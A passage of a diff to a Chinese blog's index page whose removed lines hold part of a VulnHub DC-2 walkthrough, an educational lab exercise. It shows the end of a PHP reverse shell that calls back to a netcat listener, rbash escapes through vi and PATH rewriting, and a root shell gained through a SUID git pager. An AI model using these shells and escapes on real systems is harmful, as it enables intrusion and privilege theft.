class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Kali 端监听：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
-
-<p>访问任意不存在的页面（<code>http://dc-2/xyz</code>）触发 404，Netcat 收到 Shell。</p>
-<hr>
-<h2 id="四、rbash-受限-Shell-逃逸"><a href="#四、rbash-受限-Shell-逃逸" class="headerlink" title="四、rbash 受限 Shell 逃逸"></a>四、rbash 受限 Shell 逃逸</h2><h3 id="4-1-识别-rbash-限制"><a href="#4-1-识别-rbash-限制" class="headerlink" title="4.1 识别 rbash 限制"></a>4.1 识别 rbash 限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">rbash: command not found</span><br><span class="line">$ echo $SHELL</span><br><span class="line">/bin/rbash</span><br></pre></td></tr></table></figure>
-
-<p><code>cd</code>、<code>ls</code> 等基础命令均不可用——确认为 Restricted Bash。</p>
-<h3 id="4-2-PATH-重写法"><a href="#4-2-PATH-重写法" class="headerlink" title="4.2 PATH 重写法"></a>4.2 PATH 重写法</h3><p>利用 rbash 允许命令行前缀赋值的特性：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="built_in">export</span> PATH</span><br></pre></td></tr></table></figure>
-
-<p>命令恢复正常后调用 <code>vi</code>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vi</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-vi-逃逸法"><a href="#4-3-vi-逃逸法" class="headerlink" title="4.3 vi 逃逸法"></a>4.3 vi 逃逸法</h3><p>进入 vi 后按 <code>:</code> 进入命令模式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
-
-<p>获得非受限 <code>/bin/bash</code>。</p>
-<h3 id="4-4-收集-Flag-3-与用户切换"><a href="#4-4-收集-Flag-3-与用户切换" class="headerlink" title="4.4 收集 Flag 3 与用户切换"></a>4.4 收集 Flag 3 与用户切换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/tom/flag3.txt</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Perhaps he should su for all the stress he causes.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su tom</span><br><span class="line"><span class="comment"># 密码: parturient</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、权限提升：git-SUID-→-root"><a href="#五、权限提升：git-SUID-→-root" class="headerlink" title="五、权限提升：git SUID → root"></a>五、权限提升：git SUID → root</h2><h3 id="5-1-SUID-二进制枚举"><a href="#5-1-SUID-二进制枚举" class="headerlink" title="5.1 SUID 二进制枚举"></a>5.1 SUID 二进制枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>发现异常条目：<code>/usr/bin/git</code>（<code>-rwsr-xr-x root root</code>）。</p>
-<h3 id="5-2-分页器注入提权"><a href="#5-2-分页器注入提权" class="headerlink" title="5.2 分页器注入提权"></a>5.2 分页器注入提权</h3><p>Git 以 SUID root 运行，<code>--help</code> 会调用分页器 <code>less</code>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/git --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
-
-<p>在 <code>less</code> 分页器中输入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p><strong>原理：</strong> <code>!</code> 是 <code>less</code> 的 Shell 执行命令；由于 git 以 SUID root 身份调用分页器，子进程继承 root 权限，直接弹出 root Shell。</p>
-<h3 id="5-3-最终-Flag"><a href="#5-3-最终-Flag" class="headerlink" title="5.3 最终 Flag"></a>5.3 最终 Flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">cat</span> /root/proof.txt</span><br></pre></td></tr></table></figure>
-
-<p>🚩 <strong>DC-2 完全攻克。</strong></p>
-<hr>
-<h2 id="六、攻击链总结表"><a href="#六、攻击链总结表" class="headerlink" title="六、攻击链总结表"></a>六、攻击链总结表</h2><table>
-<thead>
-<tr>
-<th>阶段</th>
-<th>技术</th>
-<th>产出</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>主机发现</td>
-<td>arp-scan &#x2F; netdiscover</td>
-<td>目标 IP</td>
-</tr>
-<tr>
-<td>端口扫描</td>
-<td>nmap -sC -sV -p-</td>
-<td>80 (HTTP), 7744 (SSH)</td>
-</tr>
-<tr>
-<td>用户枚举</td>
-<td>wpscan –enumerate u</td>
-<td>admin, tom, jerry</td>
-</tr>
-<tr>
-<td>字典生成</td>
-<td>cewl 爬取</td>
-<td>定向密码字典 dc2_pass.txt</td>
-</tr>
-<tr>
-<td>密码爆破</td>
-<td>wpscan –passwords</td>
-<td>tom:parturient, jerry:adipiscing</td>
-</tr>
-<tr>
-<td>初始访问</td>
-<td>主题编辑器反弹 Shell</td>
-<td>www-data 低权限</td>
-</tr>
-<tr>
-<td>Shell 增强</td>
-<td>vi 逃逸 &#x2F; PATH 重写</td>
-<td>非受限 bash</td>
-</tr>
-<tr>
-<td>横向移动</td>
-<td>su tom</td>
-<td>tom 用户 Shell</td>
-</tr>
-<tr>
-<td>权限提升</td>
-<td>git –help → <code>!/bin/bash</code></td>
-<td>root Shell</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="七、延伸学习"><a href="#七、延伸学习" class="headerlink" title="七、延伸学习"></a>七、延伸学习</h2><ul>
-<li>rbash 其他逃逸法：<code>man</code>、<code>less</code>、<code>more</code>、<code>awk</code>、<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code></li>
-<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFO Bins</a> —— SUID&#x2F;Sudo 提权圣经</li>
-<li>挑战 DC 系列后续靶机（DC-3 → DC-9）</li>
-<li>尝试手工完成 WordPress 用户枚举与爆破（不依赖 wpscan）</li>
-</ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-2,311/">VulnHub DC-2</a></li>
-<li><a target="_blank" rel="noopener" href="https://wpscan.com/wordpress-security-scanner/">wpscan</a></li>
-<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/">GTFO Bins - git</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.kali.org/tools/cewl/">cewl</a></li>
-</ul>
-
+          <p>VulnHub DC-2靶机实战——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/VulnHub-DC2-writeup/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1366,7 +588,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1388,7 +610,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>VulnHub DC-1 靶机完整渗透实战。从主机发现、端口扫描、Drupal 7 CMS 识别，到利用 Metasploit Drupalgeddon2（CVE-2018-7600）获取 Web Shell，最终通过 SUID find 提权拿下 root。</p>
+          <p>VulnHub DC-1 靶机实战——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/VulnHub-DC1-writeup/">
